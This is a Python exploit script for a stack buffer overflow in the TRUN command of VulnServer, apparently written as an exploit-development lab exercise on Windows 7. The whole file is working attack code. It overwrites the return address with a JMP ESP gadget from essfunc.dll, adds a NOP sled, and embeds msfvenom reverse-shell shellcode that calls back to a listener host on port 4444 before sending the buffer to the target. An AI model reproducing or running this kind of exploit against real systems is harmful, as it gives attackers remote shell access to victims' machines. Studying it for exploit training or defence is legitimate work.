######################################
#    VulnServre TRUN Command RCE     #
#    Tested on : Windows 7 Pro x64   #
######################################

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.133.140", 9999))

buf = "TRUN /.:/"

buf += "A" * 2003
buf += "\xaf\x11\x50\x62" # 0x625011af : JMP ESP (essfunc.dll)
buf += "\x90" * 16

# Payload : msfvenom -p windows/shell_reverse_tcp lhost=192.168.133.145 lport=4444 -f python -a x86 -b \x00
buf += "\xdb\xd1\xbd\xc0\x5c\x12\x27\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13\x03\xa8\x4f\xf0"
buf += "\xd2\xd4\x98\x76\x1c\x24\x59\x17\x94\xc1\x68\x17\xc2"
buf += "\x82\xdb\xa7\x80\xc6\xd7\x4c\xc4\xf2\x6c\x20\xc1\xf5"
buf += "\xc5\x8f\x37\x38\xd5\xbc\x04\x5b\x55\xbf\x58\xbb\x64"
buf += "\x70\xad\xba\xa1\x6d\x5c\xee\x7a\xf9\xf3\x1e\x0e\xb7"
buf += "\xcf\x95\x5c\x59\x48\x4a\x14\x58\x79\xdd\x2e\x03\x59"
buf += "\xdc\xe3\x3f\xd0\xc6\xe0\x7a\xaa\x7d\xd2\xf1\x2d\x57"
buf += "\x2a\xf9\x82\x96\x82\x08\xda\xdf\x25\xf3\xa9\x29\x56"
buf += "\x8e\xa9\xee\x24\x54\x3f\xf4\x8f\x1f\xe7\xd0\x2e\xf3"
buf += "\x7e\x93\x3d\xb8\xf5\xfb\x21\x3f\xd9\x70\x5d\xb4\xdc"
buf += "\x56\xd7\x8e\xfa\x72\xb3\x55\x62\x23\x19\x3b\x9b\x33"
buf += "\xc2\xe4\x39\x38\xef\xf1\x33\x63\x78\x35\x7e\x9b\x78"
buf += "\x51\x09\xe8\x4a\xfe\xa1\x66\xe7\x77\x6c\x71\x08\xa2"
buf += "\xc8\xed\xf7\x4d\x29\x24\x3c\x19\x79\x5e\x95\x22\x12"
buf += "\x9e\x1a\xf7\xb5\xce\xb4\xa8\x75\xbe\x74\x19\x1e\xd4"
buf += "\x7a\x46\x3e\xd7\x50\xef\xd5\x22\x33\xd0\x82\xa9\x52"
buf += "\xb8\xd0\xb1\x45\x65\x5c\x57\x0f\x85\x08\xc0\xb8\x3c"
buf += "\x11\x9a\x59\xc0\x8f\xe7\x5a\x4a\x3c\x18\x14\xbb\x49"
buf += "\x0a\xc1\x4b\x04\x70\x44\x53\xb2\x1c\x0a\xc6\x59\xdc"
buf += "\x45\xfb\xf5\x8b\x02\xcd\x0f\x59\xbf\x74\xa6\x7f\x42"
buf += "\xe0\x81\x3b\x99\xd1\x0c\xc2\x6c\x6d\x2b\xd4\xa8\x6e"
buf += "\x77\x80\x64\x39\x21\x7e\xc3\x93\x83\x28\x9d\x48\x4a"
buf += "\xbc\x58\xa3\x4d\xba\x64\xee\x3b\x22\xd4\x47\x7a\x5d"
buf += "\xd9\x0f\x8a\x26\x07\xb0\x75\xfd\x83\xc0\x3f\x5f\xa5"
buf += "\x48\xe6\x0a\xf7\x14\x19\xe1\x34\x21\x9a\x03\xc5\xd6"
buf += "\x82\x66\xc0\x93\x04\x9b\xb8\x8c\xe0\x9b\x6f\xac\x20"
buf += "C" * 500

s.send(buf)
s.close()
